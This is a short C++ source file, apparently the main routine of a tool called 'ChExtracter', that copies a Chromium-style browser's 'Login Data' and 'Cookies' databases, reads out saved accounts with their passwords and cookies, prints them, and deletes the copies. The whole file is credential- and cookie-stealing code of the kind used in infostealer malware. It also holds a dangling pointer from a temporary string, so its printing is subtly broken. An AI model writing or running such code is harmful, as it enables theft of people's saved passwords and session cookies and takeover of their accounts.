#include "ChExtracter.h"

int main()
{
	//SaveAccounts
	if (!CopyDB("Login Data", "P_DB"))
	{
		return 0;
	}
	sqlite3 *passwordsDB = GetDBHandler("P_DB");
	if (passwordsDB == nullptr)
	{
		return 0;
	}
	stringstream passwords = GetSaveAccounts(passwordsDB);
	//cout << passwords.str();
	const char *pChar = passwords.str().c_str();
	printf("%s\n", pChar);

	if (sqlite3_close(passwordsDB) != SQLITE_OK)
	{
		printf("%s\n", "close error..!");
	}
	if (!DeleleDB("P_DB"))
	{
		printf("%s\n", "delete error..!");
	}

	//Cookies
	if (!CopyDB("Cookies", "C_DB"))
	{
		return 0;
	}
	sqlite3 *cookiesDb = GetDBHandler("C_DB");
	if (cookiesDb == nullptr)
	{
		return 0;
	}
	stringstream cookies = GetCookies(cookiesDb);
	//cout << cookies.str();
	const char *cChar = cookies.str().c_str();
	printf("%s\n", cChar);

	if (sqlite3_close(cookiesDb) != SQLITE_OK)
	{
		printf("%s\n", "close error..!");
	}
	if (!DeleleDB("C_DB"))
	{
		printf("%s\n", "delete error..!");
	}

	system("pause");
	return 0;
}

